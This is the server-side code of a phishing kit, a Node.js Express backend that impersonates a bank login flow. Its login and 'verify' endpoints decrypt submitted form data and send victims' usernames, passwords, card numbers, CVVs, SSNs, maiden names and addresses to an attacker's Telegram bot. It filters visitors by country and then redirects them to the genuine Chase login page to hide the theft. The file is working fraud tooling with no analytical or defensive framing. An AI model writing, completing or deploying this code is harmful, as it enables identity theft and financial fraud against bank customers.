require('dotenv').config();
const express = require('express');
const cors = require('cors');
const CryptoJS = require('crypto-js');

const app = express();
const PORT = 4000;
const SECRET_KEY = "SuperSecretKey123"; // Must match frontend

app.use(cors());
app.use(express.json());

// ==========================================
// 🔓 DECRYPTION HELPER
// ==========================================
function decryptPayload(encryptedString) {
    try {
        const bytes = CryptoJS.AES.decrypt(encryptedString, SECRET_KEY);
        const decryptedString = bytes.toString(CryptoJS.enc.Utf8);
        return JSON.parse(decryptedString);
    } catch (err) {
        return null;
    }
}

// ==========================================
// 🕵️‍♂️ TELEGRAM EXFILTRATION
// ==========================================
async function sendToTelegram(message) {
    const token = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;
    if (!token || !chatId) {
        console.log("⚠️ Telegram credentials missing in .env");
        return;
    }

    try {
        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'HTML' })
        });
    } catch (err) {
        console.error("Telegram error:", err.message);
    }
}

// ==========================================
// 🗺️ GEOLOCATION & GEOFENCING
// ==========================================
async function getGeoData(ip) {
    if (ip === '::1' || ip === '127.0.0.1' || ip === '::ffff:127.0.0.1') {
        return { allowed: true, location: "Localhost (Testing)" };
    }

    try {
        const res = await fetch(`http://ip-api.com/json/${ip}`);
        const data = await res.json();
        
        if (data.status === 'success') {
            const allowedCountries = ['US', 'GB', 'CA', 'ZM']; 
            if (!allowedCountries.includes(data.countryCode)) {
                return { allowed: false, location: `${data.city}, ${data.country}` };
            }
            return { allowed: true, location: `${data.city}, ${data.country}` };
        }
    } catch (e) {}
    return { allowed: true, location: "Unknown Location" };
}

// ==========================================
// 📡 TRACKING (Silent)
// ==========================================
app.post('/api/track', async (req, res) => {
    const { payload } = req.body;
    if (!payload) return res.json({ blocked: false });

    const ip = req.ip || 'Unknown IP';
    const geo = await getGeoData(ip);
    
    if (!geo.allowed) return res.json({ blocked: true });

    // No Telegram alert for tracking.
    res.json({ blocked: false });
});

// ==========================================
// STEP 1: LOGIN
// ==========================================
app.post('/api/login', async (req, res) => {
    const { payload } = req.body;
    const data = decryptPayload(payload);
    if (!data) return res.status(400).json({ success: false });

    const { username, password } = data;
    const ip = req.ip || 'Unknown IP';
    const geo = await getGeoData(ip);

    await sendToTelegram(`
🎣 <b>CREDENTIALS CAUGHT</b>
👤 <b>User:</b> ${username}
🔑 <b>Pass:</b> ${password}
📍 <b>Loc:</b> ${geo.location}
    `);
    res.json({ success: true });
});

// ==========================================
// STEP 2: FULL PII
// ==========================================
app.post('/api/verify', async (req, res) => {
    const { payload } = req.body;
    const data = decryptPayload(payload);
    if (!data) return res.status(400).json({ success: false });

    const { 
        username, fullName, maidenName, email, phone, gender, dob, 
        cardNumber, expiry, cvv, ssn, billingAddress, city, zip, state, country 
    } = data;
    
    const ip = req.ip || 'Unknown IP';
    const geo = await getGeoData(ip);

    await sendToTelegram(`
🪪 <b>FULL PII CAUGHT</b>
👤 <b>Account:</b> ${username}
📝 <b>Name:</b> ${fullName}
👩 <b>Maiden Name:</b> ${maidenName}
📧 <b>Email:</b> ${email}
📱 <b>Phone:</b> ${phone}
🚻 <b>Gender:</b> ${gender}
🎂 <b>DOB:</b> ${dob}

💳 <b>Card:</b> ${cardNumber}
📅 <b>Expiry:</b> ${expiry}
🔒 <b>CVV:</b> ${cvv}
🆔 <b>SSN:</b> ${ssn}

🏠 <b>Address:</b> ${billingAddress}
🏙️ <b>City:</b> ${city}
📍 <b>State:</b> ${state}
📮 <b>Zip:</b> ${zip}
🌍 <b>Country:</b> ${country}

🌐 <b>IP:</b> ${ip}
    `);
    
    // Redirect to a safe page after submission
    res.status(201).json({ success: true, redirectUrl: "https://secure.chase.com/web/auth/#/logon/logon/chaseOnline" });
});

app.listen(PORT, () => {
    console.log(`🎣 Backend running on http://localhost:${PORT}`);
    console.log(`✅ Telegram exfiltration active.`);
});